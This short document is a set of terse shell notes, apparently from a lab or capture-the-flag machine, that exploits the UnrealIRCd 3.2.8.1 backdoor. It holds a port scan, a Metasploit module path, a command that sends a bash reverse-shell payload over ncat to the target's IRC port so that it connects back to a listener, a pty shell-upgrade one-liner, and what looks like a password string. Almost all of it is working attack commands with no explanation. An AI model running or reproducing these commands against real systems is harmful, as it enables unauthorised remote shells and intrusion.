echo "CD; bash -c 'bash -i >& /dev/tcp/10.10.14.6/5678 0>&1'" | ncat 10.129.184.128 8067
nmap -p- -sV 10.129.184.128 --open       6697, 8067
use exploits/unix/irc/unreal_ircd_3281_backdoor           Kab6h+m+bbp2J:HG
python -c 'import pty;pty.spawn("/bin/bash")'
